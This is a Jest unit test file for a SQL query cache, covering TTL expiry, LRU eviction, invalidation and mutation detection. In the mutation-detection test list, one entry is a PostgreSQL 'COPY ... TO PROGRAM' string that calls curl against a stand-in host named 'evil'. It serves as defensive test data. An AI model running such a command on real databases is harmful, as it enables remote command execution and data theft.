// tests/unit/query-cache.test.ts
import { QueryCache } from '../../src/classes/QueryCache.js';

describe('QueryCache', () => {
  let cache: QueryCache;
  const fakeResult = { rows: [{ id: 1 }], rowCount: 1, fields: [] };

  beforeEach(() => {
    jest.useFakeTimers();
    cache = new QueryCache();
  });
  afterEach(() => jest.useRealTimers());

  describe('get / set', () => {
    it('returns undefined on cache miss', () => {
      expect(cache.get('db1', 'SELECT 1', [])).toBeUndefined();
    });
    it('returns cached result on hit', () => {
      cache.set('db1', 'SELECT 1', [], fakeResult, 60);
      const hit = cache.get('db1', 'SELECT 1', []);
      expect(hit).toEqual(fakeResult);
    });
    it('normalises whitespace and case for cache key', () => {
      cache.set('db1', 'SELECT  *  FROM  foo', [], fakeResult, 60);
      const hit = cache.get('db1', 'select * from foo', []);
      expect(hit).toEqual(fakeResult);
    });
    it('returns undefined after TTL expires', () => {
      cache.set('db1', 'SELECT 1', [], fakeResult, 10);
      jest.advanceTimersByTime(11_000);
      expect(cache.get('db1', 'SELECT 1', [])).toBeUndefined();
    });
    it('does not cache non-deterministic queries', () => {
      cache.set('db1', 'SELECT NOW()', [], fakeResult, 60);
      expect(cache.get('db1', 'SELECT NOW()', [])).toBeUndefined();
    });
  });

  describe('LRU eviction', () => {
    it('evicts oldest entry when DB capacity exceeded', () => {
      const smallCache = new QueryCache({ maxEntriesPerDb: 3 });
      smallCache.set('db1', 'SELECT 1', [], fakeResult, 60);
      smallCache.set('db1', 'SELECT 2', [], fakeResult, 60);
      smallCache.set('db1', 'SELECT 3', [], fakeResult, 60);
      smallCache.set('db1', 'SELECT 4', [], fakeResult, 60);
      expect(smallCache.get('db1', 'SELECT 1', [])).toBeUndefined();
      expect(smallCache.get('db1', 'SELECT 4', [])).toEqual(fakeResult);
    });
  });

  describe('invalidate', () => {
    it('clears all entries for a DB on mutation', () => {
      cache.set('db1', 'SELECT 1', [], fakeResult, 60);
      cache.set('db1', 'SELECT 2', [], fakeResult, 60);
      cache.invalidate('db1');
      expect(cache.get('db1', 'SELECT 1', [])).toBeUndefined();
      expect(cache.get('db1', 'SELECT 2', [])).toBeUndefined();
    });
    it('does not affect other DBs', () => {
      cache.set('db1', 'SELECT 1', [], fakeResult, 60);
      cache.set('db2', 'SELECT 1', [], fakeResult, 60);
      cache.invalidate('db1');
      expect(cache.get('db2', 'SELECT 1', [])).toEqual(fakeResult);
    });
  });

  describe('isMutation - extended mutation detection (H5)', () => {
    // Audit H5: MUTATION_RE was extended to cover MERGE, UPSERT, GRANT, REVOKE,
    // ATTACH, DETACH, VACUUM, REINDEX, and COPY — all of which modify data/schema
    // and must invalidate cached SELECT results.
    it.each([
      'MERGE INTO target USING source ON 1=1 WHEN MATCHED THEN UPDATE SET x = 1',
      'UPSERT INTO users (id, name) VALUES (1, \"a\")',
      'GRANT SELECT ON users TO readonly',
      'REVOKE SELECT ON users FROM readonly',
      'ATTACH DATABASE \"other.db\" AS other',
      'DETACH DATABASE other',
      'VACUUM',
      'REINDEX users',
      "COPY users FROM '/tmp/data.csv'",
      "COPY (SELECT 1) TO PROGRAM 'curl http://evil'",
    ])('detects %s as a mutation', (sql) => {
      expect(cache.isMutation(sql)).toBe(true);
    });

    it('still detects original mutations (INSERT, UPDATE, DELETE, DROP, etc.)', () => {
      expect(cache.isMutation('INSERT INTO t VALUES (1)')).toBe(true);
      expect(cache.isMutation('UPDATE t SET x = 1')).toBe(true);
      expect(cache.isMutation('DELETE FROM t')).toBe(true);
      expect(cache.isMutation('DROP TABLE t')).toBe(true);
      expect(cache.isMutation('TRUNCATE TABLE t')).toBe(true);
      expect(cache.isMutation('ALTER TABLE t ADD COLUMN x INT')).toBe(true);
      expect(cache.isMutation('CREATE TABLE t (x INT)')).toBe(true);
      expect(cache.isMutation('REPLACE INTO t VALUES (1)')).toBe(true);
    });

    it('does not flag SELECT as a mutation', () => {
      expect(cache.isMutation('SELECT * FROM users')).toBe(false);
      expect(cache.isMutation('  SELECT 1')).toBe(false);
    });
  });

  describe('shouldCache', () => {
    it('returns true for SELECT', () => {
      expect(cache.shouldCache('SELECT * FROM foo')).toBe(true);
    });
    it('returns false for INSERT', () => {
      expect(cache.shouldCache('INSERT INTO foo VALUES (1)')).toBe(false);
    });
    it('returns false for UPDATE', () => {
      expect(cache.shouldCache('UPDATE foo SET bar = 1')).toBe(false);
    });
    it('returns false for non-deterministic SELECT', () => {
      expect(cache.shouldCache('SELECT RAND()')).toBe(false);
    });
  });
});
